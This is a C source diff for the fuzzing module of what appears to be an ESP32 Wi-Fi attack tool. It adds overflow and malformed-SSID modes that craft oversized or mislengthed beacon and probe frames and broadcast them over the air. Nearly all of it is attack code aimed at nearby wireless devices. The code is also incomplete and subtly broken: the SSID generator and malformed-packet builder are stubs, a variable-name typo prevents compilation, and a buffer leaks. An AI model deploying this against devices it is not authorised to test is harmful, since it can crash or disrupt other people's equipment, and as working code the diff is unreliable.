@@ -1,5 +1,6 @@
 #include "fuzz.h"
 #include "beacon.h"
+#include "probe.h"
 #include "common.h"
 #include "esp_err.h"
 #include "esp_flip_struct.h"
@@ -10,13 +11,17 @@ FuzzMode fuzzMode = FUZZ_MODE_OFF;
 FuzzPacketType fuzzPacketType = FUZZ_PACKET_NONE;
 static TaskHandle_t fuzzTask = NULL;
 
-static int fuzzCountUpper = 0;
-static int fuzzCountLower = 0;
+int fuzzCounter = 0;
+int malformedFrom = 16; /* Default at half the length */
+bool firstCallback = true;
+bool malformedPartOne = true;
+const char *FUZZ_TAG = "fuzz@GRAVITY";
 
-char *randomSsid(int len) {
+
+esp_err_t randomSsid(char **ssid, int len) {
     //
 
-    return "";
+    return ESP_OK;
 }
 /* Function may use up to 15 bytes of memory at the
    location specified by result */
@@ -77,61 +82,183 @@ esp_err_t fuzzPacketTypeAsString(char *result) {
     return ESP_OK;
 }
 
+/* Set the base length of SSIDs using malformed mode */
+/* Default is set to 16 as a default */
+esp_err_t setMalformedSsidLength(int newLength) {
+    if (newLength < 0) {
+        ESP_LOGE(FUZZ_TAG, "Cannot specify a negative length.");
+        return ESP_ERR_INVALID_ARG;
+    }
+    malformedFrom = newLength;
+    return ESP_OK;
+}
+
 /* Generates a suitable packet for the SSID overflow attack */
 /* Will generate any packet type defined in FuzzPacketType.
    Returns the size of the resulting packet, which will be 
    stored in outBytes upon conclusion. Caller must allocate memory */
 int fuzz_overflow_pkt(FuzzPacketType ptype, int ssidSize, uint8_t *outBytes) {
     // TODO - inc current upper, copy start of pkt to outBytes, add len, gen and add SSID, finish pkt
-    
-    /* If variables unset then set it to max SSID length + 1 */
-    if (fuzzCountUpper == 0) {
-        fuzzCountUpper = MAX_SSID_LEN + 1;
+
+    uint8_t *packet_raw = NULL;
+    int packet_len = 0;
+    int thisSsidOffset = 0;
+    int thisBssidOffset = 0;
+    int thisSrcAddrOffset = 0;
+    int thisDestAddrOffset = 0;
+    switch (ptype) {
+        case FUZZ_PACKET_BEACON:
+            packet_raw = beacon_raw;
+            packet_len = BEACON_PACKET_LEN;
+            thisSsidOffset = BEACON_SSID_OFFSET;
+            thisBssidOffset = BEACON_BSSID_OFFSET;
+            thisSrcAddrOffset = BEACON_SRCADDR_OFFSET;
+            thisDestAddrOffset = BEACON_DESTADDR_OFFSET;
+            break;
+        case FUZZ_PACKET_PROBE_REQ:
+            packet_raw = probe_raw;
+            packet_len = PROBE_REQUEST_LEN;
+            thisSsidOffset = PROBE_SSID_OFFSET;
+            thisBssidOffset = PROBE_BSSID_OFFSET;
+            thisSrcAddrOffset = PROBE_SRCADDR_OFFSET;
+            thisDestAddrOffset = PROBE_DESTADDR_OFFSET;
+            break;
+        case FUZZ_PACKET_PROBE_RESP:
+            packet_raw = probe_response_raw;
+            packet_len = PROBE_RESPONSE_LEN;
+            thisSsidOffset = PROBE_RESPONSE_SSID_OFFSET;
+            thisBssidOffset = PROBE_RESPONSE_BSSID_OFFSET;
+            thisSrcAddrOffset = PROBE_RESPONSE_SRC_ADDR_OFFSET;
+            thisDestAddrOffset = PROBE_RESPONSE_DEST_ADDR_OFFSET;
+            break;
+        default:
+            #ifdef CONFIG_FLIPPER
+                printf("Invalid packet type: %d\n", ptype);
+            #else
+                ESP_LOGE(FUZZ_TAG, "Invalid packet type encountered: %d", pytype);
+            #endif
+            return 0;
     }
+
     /* Construct our packet in-place in outBytes */
-    memcpy(outBytes, beacon_raw, BEACON_SSID_OFFSET - 1);
-    outBytes[BEACON_SSID_OFFSET - 1] = (uint8_t)fuzzCountUpper;
+    memcpy(outBytes, packet_raw, thisSsidOffset - 1);
+    outBytes[thisSsidOffset - 1] = (uint8_t)fuzzCounter; /* ssid_len */
     /* Generate a random SSID of the desired length and append to the packet */
-    char *ssid = randomSsid(fuzzCountUpper);
-    memcpy(&outBytes[BEACON_SSID_OFFSET], (uint8_t *)ssid, fuzzCountUpper);
+    char *ssid = malloc(sizeof(char) * (fuzzCounter + 1)); /* Other callers may want to use it as a string */
+    if (ssid == NULL) {
+        #ifdef CONFIG_FLIPPER
+            printf("Failed to allocate %db for an SSID\n", fuzzCounter);
+        #else
+            ESP_LOGE(FUZZ_TAG, "Failed to allocate %d bytes for an SSID", fuzzCounter);
+        #endif
+        return ESP_ERR_NO_MEM;
+    }
+    /* Generate a random SSID of the required length */
+    if (randomSsid(&ssid, fuzzCounter) != ESP_OK) {
+        #ifdef CONFIG_FLIPPER
+            printf("Failed to generate an SSID!\n");
+        #else
+            ESP_LOGE(FUZZ_TAG, "Failed to generate an SSID of length %d", fuzzCounter);
+        #endif
+        return ESP_ERR_NO_MEM;
+    }
+    memcpy(&outBytes[thisSsidOffset], (uint8_t *)ssid, fuzzCounter);
 
     /* Finish the packet */
-    memcpy(&outBytes[BEACON_SSID_OFFSET + fuzzCountUpper], &beacon_raw[BEACON_SSID_OFFSET], BEACON_PACKET_LEN - BEACON_SSID_OFFSET);
+    memcpy(&outBytes[thisSsidOffset + fuzzCounter], &packet_raw[thisSsidOffset], packet_len - thisSsidOffset);
 
-    return BEACON_PACKET_LEN + fuzzCountUpper;
+    return packet_len + fuzzCounter;
 }
 
 /* Generates packets for the Malformed SSID attack */
 /* Will generate any packet type defined in FuzzPacketType.
    Returns the size of the resulting packet, which will be 
    stored in outBytes upon conclusion. Caller must allocate memory */
-int fuzz_malformed_pkt(FuzzPacketType ptype) {
+int fuzz_malformed_pkt(FuzzPacketType ptype, int ssidSize, uint8_t *outBytes) {
     // TODO
 
     return ESP_OK;
 }
 
 /* Implementation of malformed mode */
+/* This process will alternate between sending packets longer than expected
+   and shorter than expected. For example, with a starting length of 16,
+   Gravity will send packets with lengths 17, 15, 18, 14, etc.
+*/
 void fuzz_malformed_callback(void *pvParameter) {
-    // TODO
+    if (firstCallback) {
+        firstCallback = false;
+        fuzzCounter = 0;
+        malformedPartOne = true;
+    }
+    /* Allocate space for the packet */
+    int biggestPktLen = MAX(BEACON_PACKET_LEN, MAX(PROBE_REQUEST_LEN, PROBE_RESPONSE_LEN)) + MAX(MAX_SSID_LEN, (fuzzCounter + malformedFrom));
+    uint8_t *pkt = malloc(sizeof(uint8_t) * biggestPktLen);
+    if (pkt == NULL) {
+        #ifdef CONFIG_FLIPPER
+            printf("No memory for universal packet\n");
+        #else
+            ESP_LOGE(FUZZ_TAG, "Unable to reserve %d bytes for a universal packet", biggestPktLen);
+        #endif
+        return;
+    }
+    /* SSID length will be malformedFrom +/- fuzzCounter. If (malformedPartOne) we add fuzzCounter.
+       If !malformedFrom we subtract. */
+    int ssidLen = malformedFrom;
+    if (malformedPartOne) {
+        ssidLen += fuzzCounter;
+    } else {
+        ssidLen -= fuzzCounter;
+        if (ssidLen < 0) {
+            ssidLen = 0;
+        }
+    }
+    /* Generate a packet of the required type and SSID */
+    int pkt_len = fuzz_malformed_pkt(fuzzPacketType, ssidLen, pkt);
+
+    /* TODO: Set BSSID, SRCADDR, DESTADDR */
+
+    esp_wifi_80211_tx(WIFI_IF_AP, pkt, pkt_len, true);
+
+    /* Prepare for the next cycle */
+    if (malformedPartOne) {
+        malformedPartOne = false;
+    } else {
+        malformedPartOne = true;
+        ++fuzzCounter;
+    }
+
+    free(pkt);
 }
 
 /* Implementation of overflow mode */
 void fuzz_overflow_callback(void *pvParameter) {
-    if (fuzzCountUpper == 0) {
-        fuzzCountUpper = MAX_SSID_LEN + 1;
+    if (firstCallback) {
+        fuzzCounter = MAX_SSID_LEN + 1;
+        firstCallback = false;
     }
-    /* Generate a beacon packet with an appropriate SSID */
-    uint8_t *beacon_pkt = malloc(sizeof(uint8_t) * (BEACON_PACKET_LEN + MAX_SSID_LEN));
-    int beacon_len = fuzz_overflow_pkt(fuzzPacketType, fuzzCountUpper, beacon_pkt);
+    /* How much space do we need to allocate for the packet? */
+    int biggestPktLen = MAX(BEACON_PACKET_LEN, MAX(PROBE_REQUEST_LEN, PROBE_RESPONSE_LEN)) + MAX(MAX_SSID_LEN, fuzzCounter);
+    uint8_t *pkt = malloc(sizeof(uint8_t) * biggestPktLen);
+    if (pkt == NULL) {
+        #ifdef CONFIG_FLIPPER
+            printf("No memory for universal packet\n");
+        #else
+            ESP_LOGE(FUZZ_TAG, "Unable to reserve %d bytes for a universal packet template", biggestPktLen);
+        #endif
+        return;
+    }
+    /* Generate a packet of the specified type with an appropriate SSID */
+    int pkt_len = fuzz_overflow_pkt(fuzzPacketType, fuzzCounter, pkt);
 
     /* TODO: Different options for sender */
 
     /* TODO: Different options for recipient */
 
-    esp_wifi_80211_tx(WIFI_IF_AP, beacon_pkt, beacon_len, true);
+    esp_wifi_80211_tx(WIFI_IF_AP, pkt, pkt_len, true);
 
-    ++fuzzCountUpper;
+    ++fuzzCounter;
+    free(pkt);
 }
 
 /* Master event loop */
@@ -155,6 +282,9 @@ void fuzzCallback(void *pvParameter) {
 esp_err_t fuzz_start(FuzzMode newMode, FuzzPacketType newType) {
     fuzzMode = newMode;
     fuzzPacketType = newType;
+    fuzzCounter = 0;
+    firstCallback = true;
+    malformedPartOne = true;
 
     /* If Fuzz is already running stop it first */
     if (attack_status[ATTACK_FUZZ]) {
@@ -167,8 +297,7 @@ esp_err_t fuzz_start(FuzzMode newMode, FuzzPacketType newType) {
 }
 
 esp_err_t fuzz_stop() {
-    fuzzCountLower = 0;
-    fuzzCountUpper = 0;
+    fuzzCounter = 0;
     if (fuzzTask != NULL) {
         vTaskDelete(fuzzTask);
     }
